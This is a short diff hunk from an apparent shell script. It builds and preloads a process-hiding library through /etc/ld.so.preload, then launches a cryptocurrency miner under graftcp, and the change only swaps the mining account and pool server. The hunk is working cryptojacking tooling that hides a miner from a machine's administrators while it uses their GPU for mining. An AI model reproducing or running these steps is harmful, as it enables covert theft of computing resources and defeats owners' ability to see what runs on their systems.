@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --user GRGFLhTrLkxUF3hJFdaA6QJQPPkZM9RjHt.bezzHash --server ssl://us-btg.2miners.com --port 14040 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes
+./graftcp/graftcp ./bezzHash --user mikrotik999.TeslaT4 --server us-east.equihash-hub.miningpoolhub.com --port 20595 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes
